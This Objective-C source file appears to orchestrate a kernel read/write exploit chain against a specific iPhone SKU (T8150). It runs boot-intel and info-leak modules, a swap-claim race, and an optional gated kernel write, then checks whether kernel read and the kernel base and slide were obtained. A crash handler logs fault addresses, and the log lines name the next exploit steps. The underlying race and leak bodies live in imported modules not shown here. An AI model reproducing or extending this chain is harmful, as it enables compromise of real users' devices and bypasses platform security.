//
//  P170T8150Composite.m — the 17 Pro Max composite KRW chain (one boot). p170.
//  2026-11-17.
//
//  Wiring law (note 271 = PLAN B): leaks + boot learning + the claim race in
//  ONE boot, the p142 write knob-GATED, the kread32 gate honest. Every
//  sub-tap is the existing controller UNCHANGED (race bodies are not edited —
//  Exploit law); this file only sequences them and carries the log.
//  Sub-taps: P139BootIntel / P114SurfaceLeak / P110SurfaceSwapClaim
//  (its v2 leak-gate pairs the sel-8 leak into the claim stage by itself) /
//  P142AVETemporal (knob-gated) / P007Board kread32.
//

#import "P170T8150Composite.h"
#import "P139BootIntel.h"
#import "P114SurfaceLeak.h"
#import "P110SurfaceSwapClaim.h"
#import "P142AVETemporal.h"
#import "P007Board.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <fcntl.h>
#import <unistd.h>
#import <string.h>
#import <signal.h>
#define _XOPEN_SOURCE 1
#import <ucontext.h>

#define P170_BUILD @"p170-t8150-composite-v1"

static int g_p170_fd = -1;
static NSMutableString *g_p170_out;

static void p170_line(NSString *s) {
    if (![s isEqualToString:@"\n"] && ![s hasSuffix:@"\n"]) s = [s stringByAppendingString:@"\n"];
    [g_p170_out appendString:s];
    if (g_p170_fd >= 0) {
        const char *c = s.UTF8String;
        if (c) { write(g_p170_fd, c, strlen(c)); fcntl(g_p170_fd, F_FULLFSYNC); }
    }
}


/* family-B alias-path fault capture: SIGSEGV/SIGBUS handler writes far+pc
   straight to the fsync log (async-signal-safe syscalls only), then
   re-raises so the crash reporter sees the same death. */
static void p170_sighandler(int sig, siginfo_t *si, void *uctx) {
    if (g_p170_fd >= 0) {
        ucontext_t *uc = (ucontext_t *)uctx;
        uint64_t pc = 0;
#if defined(__arm64__) || defined(__aarch64__)
        pc = uc->uc_mcontext->__ss.__pc;
#endif
        uint64_t far = (uint64_t)si->si_addr;
        char buf[192];
        int n = snprintf(buf, sizeof(buf),
            "[SIG %d] far=0x%016llx pc=0x%016llx (family-B alias capture)\n",
            sig, (unsigned long long)far, (unsigned long long)pc);
        if (n > 0) { write(g_p170_fd, buf, (size_t)n); fcntl(g_p170_fd, F_FULLFSYNC); }
    }
    struct sigaction d; memset(&d, 0, sizeof(d));
    d.sa_handler = SIG_DFL;
    sigaction(sig, &d, NULL);
    raise(sig);
}

@implementation P170T8150Composite

+ (NSString *)tap {
    NSMutableString *o = [NSMutableString string];
    g_p170_out = o;
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                          NSUserDomainMask, YES) firstObject];
    {
        struct sigaction sa; memset(&sa, 0, sizeof(sa));
        sa.sa_sigaction = p170_sighandler;
        sa.sa_flags = SA_SIGINFO;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);
    }
    g_p170_fd = open([docs stringByAppendingPathComponent:@"p170_t8150_log.txt"].fileSystemRepresentation,
                     O_CREAT | O_WRONLY | O_TRUNC, 0644);
    p170_line([NSString stringWithFormat:@"=== p170 session %@ BUILD %@ ===",
               LabLocalMilitaryNow(), P170_BUILD]);
    p170_line([LabDeviceProfile identBlock]);

    /* SKU GATE: T8150 only */
    NSString *sku = [LabDeviceProfile skuName];
    if (![sku containsString:@"T8150"]) {
        p170_line([NSString stringWithFormat:@"[-] STOP — sku=%@ is not the 17. "
                   "This composite is T8150-law (P169-style cross-paste protected).", sku]);
        if (g_p170_fd >= 0) { fcntl(g_p170_fd, F_FULLFSYNC); close(g_p170_fd); g_p170_fd = -1; }
        return o;
    }
    p170_line(@"PANIC-POSSIBLE (P110 claim stage; P142 only with the knob file). "
              @"ONE TAP per force-quit. P143 stays catalog-solo by the T1 law.");

    /* 1. BOOT LEARN */
    p170_line(@"\n[1 BOOT LEARN] P139BootIntel —");
    @try { p170_line([P139BootIntel tap]); }
    @catch (NSException *e) { p170_line([NSString stringWithFormat:@"[-] P139 exception %@", e.name]); }
    p170_line(@"[1 done]");

    /* 2. LEAK (the formula leak; every KV = DISCLOSURE class, not kread) */
    p170_line(@"\n[2 LEAK] P114SurfaceLeak (sel-8 serializer) —");
    @try { p170_line([P114SurfaceLeak tap]); }
    @catch (NSException *e) { p170_line([NSString stringWithFormat:@"[-] P114 exception %@", e.name]); }
    p170_line(@"[2 done]");

    /* 3. CLAIM (the 112477 swap-claim race; v2 pairs the leak itself) */
    p170_line(@"\n[3 CLAIM] P110SurfaceSwapClaim —");
    @try { p170_line([P110SurfaceSwapClaim tap]); }
    @catch (NSException *e) { p170_line([NSString stringWithFormat:@"[-] P110 exception %@", e.name]); }
    p170_line(@"[3 done] — family-B far 0x0020000000000048 = the attested window");

    /* 4. WRITE (knob-gated: p142_layers.txt must exist) */
    NSString *knobPath = [docs stringByAppendingPathComponent:@"p142_layers.txt"];
    if ([[NSFileManager defaultManager] fileExistsAtPath:knobPath]) {
        p170_line([NSString stringWithFormat:@"\n[4 WRITE] P142AVETemporal — knob=%@ —",
                   [NSString stringWithContentsOfFile:knobPath encoding:NSUTF8StringEncoding error:nil] ?: @"?"]);
        @try { p170_line([P142AVETemporal tap]); }
        @catch (NSException *e) { p170_line([NSString stringWithFormat:@"[-] P142 exception %@ "
                                             @"(bug_type 110 task=AVD-class = the 112705 attestation)", e.name]); }
        p170_line(@"[4 done]");
    } else {
        p170_line(@"\n[4 WRITE] SKIPPED — Documents/p142_layers.txt ABSENT (knob law).");
        p170_line(@"          arm = write the layer count (e.g. 16463 = the 112705 panic");
        p170_line(@"          attestation; 16462 = survives) via p146, then re-tap p170.");
    }

    /* 5. HONESTY GATE */
    p170_line(@"\n[5 GATE] board kread law —");
    P007Board *board = [P007Board shared];
    p170_line([NSString stringWithFormat:
        @"    hasKread=%@ hasKwrite=%@ kbase=0x%llx kslide=0x%llx %s",
        board.hasKread ? @"YES" : @"NO", board.hasKwrite ? @"YES" : @"NO",
        (unsigned long long)board.kbase, (unsigned long long)board.kslide,
        board.kreadSignal.UTF8String ?: ""]);
    p170_line(@"    LAW: hasKread flips ONLY on kread32(kbase)==0xfeedfacf via");
    p170_line(@"    commitSlide. Leaks/KVAs/P142 occupancy/family-B NEVER set it.");
    p170_line(@"    If today's P114 leak class carries a header-adjacent KVA and the");
    p170_line(@"    P110 claim family-B fires, the next rung is the p073-anchor pairing");
    p170_line(@"    (PLAN B rungs 4-5; the kdesc door 0xac9f188 quartet is named static).");

    p170_line(@"\n=== p170 done (one tap per force-quit) ===");
    if (g_p170_fd >= 0) { fcntl(g_p170_fd, F_FULLFSYNC); close(g_p170_fd); g_p170_fd = -1; }
    return o;
}

@end
